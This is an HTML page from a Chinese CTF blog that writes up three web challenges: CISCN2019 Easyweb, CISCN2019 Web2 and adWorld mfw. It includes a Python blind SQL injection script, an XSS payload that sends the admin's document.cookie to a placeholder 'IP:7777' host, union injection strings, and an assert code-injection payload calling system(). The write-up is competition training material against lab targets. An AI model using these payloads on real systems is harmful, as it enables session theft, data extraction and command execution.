@@ -1,0 +1,284 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>一周CTF（第7周 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="一周CTF（第7周 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="BUU
+[CISCN2019 总决赛 Day2 Web1]Easyweb
+image.php.bak有源码
+&lt;?php
+include &quot;config.php&quot;;
+
+$id=isset($_GET[&quot;id..." />
+    <meta name="keywords" content="日常,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              一周CTF（第7周
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-08-06
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/k_UdJm9MZ/" class="post-tag">
+                  # 日常
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/yi-zhou-ctfdi-7-zhou.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="buu">BUU</h1>
+<h2 id="ciscn2019-总决赛-day2-web1easyweb">[CISCN2019 总决赛 Day2 Web1]Easyweb</h2>
+<p>image.php.bak有源码</p>
+<pre><code class="language-php">&lt;?php
+include &quot;config.php&quot;;
+
+$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;
+$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;
+
+$id=addslashes($id);
+$path=addslashes($path);
+
+$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\'&quot;,&quot;'&quot;),&quot;&quot;,$id);
+$path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\'&quot;,&quot;'&quot;),&quot;&quot;,$path);
+
+$result=mysqli_query($con,&quot;select * from images where id='{$id}' or path='{$path}'&quot;);
+$row=mysqli_fetch_array($result,MYSQLI_ASSOC);
+
+$path=&quot;./&quot; . $row[&quot;path&quot;];
+header(&quot;Content-Type: image/jpeg&quot;);
+readfile($path);
+</code></pre>
+<p><code>id=\0</code> -&gt; addslashes -&gt; <code>id=\\0</code> -&gt; str_replace -&gt; <code>id=\</code> 这样可以让id后面的第二个<code>'</code>逃逸出来。</p>
+<p>测试payload：<code>?id=\0&amp;path=or 1=1--+</code></p>
+<p>盲注出admin的密码，登录：</p>
+<pre><code class="language-python">import requests
+import time
+
+url = &quot;http://a159cb3b-16f9-4761-86f2-e9acffea53f9.node4.buuoj.cn:81/image.php&quot;  # Target URL
+result = &quot;&quot;
+
+for i in range(1, 1000):  # adjust as needed
+    param_data = {}
+    low = 32
+    high = 128
+    mid = (low + high) // 2
+    while low &lt; high:
+        injection_str = f&quot;or (ASCII(substr((SELECT(group_concat(password))FROM(users)),{i},1))&gt;{mid})#&quot;
+        param_data['path'] = injection_str
+        param_data['id'] = '\\0'
+        response = requests.get(url, params=param_data)
+        time.sleep(0.04)
+        if response.text:  # 在这个区域中
+            low = mid + 1
+        else:
+            high = mid
+        mid = (high + low) // 2
+
+    result += chr(mid)
+    print(&quot;Extracted so far: &quot; + result)
+    if mid == 32 or mid == 127:
+        break
+</code></pre>
+<p>登录后有个文件上传点，上传的文件会被记录<br>
+<img src="https://skyblu3519.github.io/post-images/1691335293000.png" alt="" loading="lazy"></p>
+<p>这里记录的文件后缀为<code>.php</code>，于是可以在文件名处写个shell<br>
+<img src="https://skyblu3519.github.io/post-images/1691335304302.png" alt="" loading="lazy"></p>
+<p>读flag就行<br>
+<img src="https://skyblu3519.github.io/post-images/1691335312590.png" alt="" loading="lazy"></p>
+<h2 id="ciscn2019-华东北赛区web2">[CISCN2019 华东北赛区]Web2</h2>
+<p>注册用户后的投稿处有XSS，没有过滤script标签，但对内容做了些过滤。</p>
+<p>这里的绕过方式是markup，payload格式如下<code>&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34 [实体编码后的script代码] &amp;#34&amp;#41&lt;/script&gt;</code></p>
+<p>构造js代码把admin的session打出来：</p>
+<pre><code class="language-python">payload = &quot;&quot;&quot;var url='http://IP:7777/?r='+encodeURIComponent(document.cookie);
+window.location=url;
+&quot;&quot;&quot;
+output = &quot;&quot;
+for c in payload:
+    output += &quot;&amp;#&quot; + str(ord(c))
+
+print(&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + output + &quot;&amp;#34&amp;#41&lt;/script&gt;&quot;)
+</code></pre>
+<p>admin的页面在<code>admin.php</code>这条路径是扫出来的。</p>
+<p>登录后是一个简单的sql注入，payload：<code>?id=0 union select 1,(select group_concat(flagg) from flag),3</code></p>
+<p>get flag<br>
+<img src="https://skyblu3519.github.io/post-images/1691335343675.png" alt="" loading="lazy"></p>
+<h1 id="adworld">adWorld</h1>
+<h2 id="mfw">mfw</h2>
+<p>首先是git泄露读源码。</p>
+<p>关键点在</p>
+<pre><code class="language-php">$file = &quot;templates/&quot; . $page . &quot;.php&quot;;
+
+// I heard '..' is dangerous!
+assert(&quot;strpos('$file', '..') === false&quot;) or die(&quot;Detected hacking attempt!&quot;);
+
+// TODO: Make this look nice
+assert(&quot;file_exists('$file')&quot;) or die(&quot;That file doesn't exist!&quot;);
+</code></pre>
+<p>因为assert执行的代码直接从$file中拼接，所以导致了命令执行。</p>
+<p>闭合<code>file_exists</code>再执行一条我们的代码，payload：<code>?page=').system('cat templates/flag.php');#</code></p>
+<p>值得注意的是，assert只能执行一行语句，不同的语句用<code>.</code>连接，意思是拼接函数执行的返回结果。所以，这里不能像eval用<code>;</code>来拼接多条命令。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#buu">BUU</a>
+<ul>
+<li><a href="#ciscn2019-%E6%80%BB%E5%86%B3%E8%B5%9B-day2-web1easyweb">[CISCN2019 总决赛 Day2 Web1]Easyweb</a></li>
+<li><a href="#ciscn2019-%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BAweb2">[CISCN2019 华东北赛区]Web2</a></li>
+</ul>
+</li>
+<li><a href="#adworld">adWorld</a>
+<ul>
+<li><a href="#mfw">mfw</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/zer0pts-ctf-2023warmuprofile/">
+              <h3 class="post-title">
+                [zer0pts CTF 2023]Warmuprofile
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
